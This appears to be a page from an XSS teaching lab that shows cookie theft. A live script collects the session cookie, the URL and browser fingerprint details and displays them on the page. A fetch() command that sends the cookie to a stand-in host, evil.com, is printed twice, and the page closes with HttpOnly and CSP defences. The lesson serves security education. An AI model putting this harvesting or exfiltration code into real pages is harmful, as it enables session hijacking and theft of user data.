# XSS Test 2 — Cookie Theft

This page just silently harvested session data from the browser. No popups, no warnings — everything happened in the background. The stolen information is displayed below.

<div id="stolen-data" style="background:#1a1a2e;border:2px solid #ff4444;border-radius:10px;padding:24px;margin:20px 0;font-family:monospace;"></div>

<script>
var box = document.getElementById('stolen-data');
var info = '';

// Session cookie'yi yakala
var cookies = document.cookie;

info += '<h3 style="color:#ff4444;margin:0 0 16px;font-size:18px;">ATTACK SUCCESSFUL — Data Harvested</h3>';

info += '<div style="margin-bottom:14px;">';
info += '<p style="color:#6ea8fe;font-size:12px;margin:0 0 4px;text-transform:uppercase;letter-spacing:0.06em;">Session Cookie</p>';
info += '<p style="color:#e6edf3;margin:0;word-break:break-all;font-size:13px;background:#0d1117;padding:10px;border-radius:6px;">' + (cookies || '(empty — not logged in)') + '</p>';
info += '</div>';

info += '<div style="margin-bottom:14px;">';
info += '<p style="color:#6ea8fe;font-size:12px;margin:0 0 4px;text-transform:uppercase;letter-spacing:0.06em;">Current URL</p>';
info += '<p style="color:#e6edf3;margin:0;font-size:13px;">' + window.location.href + '</p>';
info += '</div>';

info += '<div style="margin-bottom:14px;">';
info += '<p style="color:#6ea8fe;font-size:12px;margin:0 0 4px;text-transform:uppercase;letter-spacing:0.06em;">Browser / OS</p>';
info += '<p style="color:#e6edf3;margin:0;font-size:13px;">' + navigator.userAgent + '</p>';
info += '</div>';

info += '<div style="display:flex;gap:20px;margin-bottom:14px;">';
info += '<div><p style="color:#6ea8fe;font-size:12px;margin:0 0 4px;text-transform:uppercase;">Screen</p><p style="color:#e6edf3;margin:0;font-size:13px;">' + screen.width + 'x' + screen.height + '</p></div>';
info += '<div><p style="color:#6ea8fe;font-size:12px;margin:0 0 4px;text-transform:uppercase;">Platform</p><p style="color:#e6edf3;margin:0;font-size:13px;">' + navigator.platform + '</p></div>';
info += '<div><p style="color:#6ea8fe;font-size:12px;margin:0 0 4px;text-transform:uppercase;">Language</p><p style="color:#e6edf3;margin:0;font-size:13px;">' + navigator.language + '</p></div>';
info += '</div>';

info += '<hr style="border-color:#21262d;margin:18px 0;">';

info += '<p style="color:#ff6666;font-size:13px;margin:0 0 8px;">In a real attack, all of this would be silently sent to the attacker\'s server:</p>';
info += '<code style="display:block;background:#0d1117;padding:12px;border-radius:6px;color:#7ee787;font-size:12px;word-break:break-all;">fetch("https://evil.com/steal", {\n  method: "POST",\n  body: JSON.stringify({\n    cookie: "' + cookies + '",\n    url: "' + location.href + '",\n    userAgent: navigator.userAgent\n  })\n})</code>';

box.innerHTML = info;
</script>

---

## What just happened?

Unlike Test 1 which showed a loud, obvious alert box, this attack was completely silent. No popup, no visual disruption, nothing to tip off the user that something went wrong. The page loaded normally and the script ran in the background — exactly how a real attacker would design it.

The script accessed several pieces of information that the browser freely exposes to any JavaScript running on the page. The most critical one is `document.cookie`.

## Why the cookie matters

When the login happened a few moments ago (through `/login` with a username and password), Flask created a **session**. That session contains the username, the role, and the login status. Flask then serialized all of that data, signed it with the `SECRET_KEY`, and sent it back to the browser as a cookie in the `Set-Cookie` HTTP header. The browser stored that cookie and now automatically attaches it to every request made to this site.

That cookie visible in the red box above? That's the entire session. It's a Base64-encoded, cryptographically signed blob that contains something like:

```
{"logged_in": true, "username": "admin", "role": "admin"}
```

If an attacker gets that cookie value, they can paste it into their own browser using developer tools. At that point, the server sees the same valid session token and thinks the attacker is the legitimate user. No password needed. This is called **session hijacking**.

## The silent exfiltration

The red box at the top is just for demonstration — it shows what was captured right on the page so the attack is visible. In a real scenario, nothing would appear on screen. Instead, the script would contain something like:

```
fetch("https://evil.com/steal", {
    method: "POST",
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href
    })
})
```

This sends an HTTP request to the attacker's server with all the stolen data. The `fetch()` call is asynchronous and invisible — the page doesn't reload, no popup appears, the user has no idea anything happened. The attacker's server logs the incoming data, and now they have the session cookie.

The whole thing takes less than 10 milliseconds.

## What else was collected and why

Beyond the cookie, the script also grabbed `navigator.userAgent`, `screen.width`, `screen.height`, `navigator.platform`, and `navigator.language`. These seem harmless individually, but together they form a **browser fingerprint**. An attacker uses this information for several purposes: to identify the operating system and browser version (which reveals which exploits might work), to craft more convincing phishing attacks tailored to the user's setup, and to correlate this stolen session with other data they may have collected from other attacks.

## How this differs from Test 1

Test 1 answered the question: "Can arbitrary JavaScript run on this page?" The answer was yes. Test 2 answers the follow-up question: "What can that JavaScript actually do?" The answer is: access cookies, read session tokens, collect browser metadata, and silently send all of it to an external server — without the user noticing a thing.

The alert box in Test 1 is actually the worst way to write a real attack, because it immediately reveals that something is wrong. A real attacker never uses `alert()`. They run silent scripts like this one that collect, exfiltrate, and leave no trace.

## How this could have been prevented

The most effective defense against cookie theft via XSS is the `HttpOnly` flag. When a cookie is set with `HttpOnly`, the browser blocks JavaScript from accessing it through `document.cookie`. The cookie still gets sent with HTTP requests normally, but scripts on the page literally cannot see it. Flask supports this — and actually sets `HttpOnly` on session cookies **by default**. However, this demo may show the cookie because of how the session configuration is set up.

Even with `HttpOnly`, the other data (URL, user agent, screen info) is still accessible. That's why cookie protection alone isn't enough. The root fix is the same as Test 1: prevent the XSS from executing in the first place through input sanitization, output encoding, and Content-Security-Policy headers. The `HttpOnly` flag is a second layer of defense — it limits the damage if XSS somehow gets through.

Defense in depth means assuming each layer will fail and building the next one anyway.
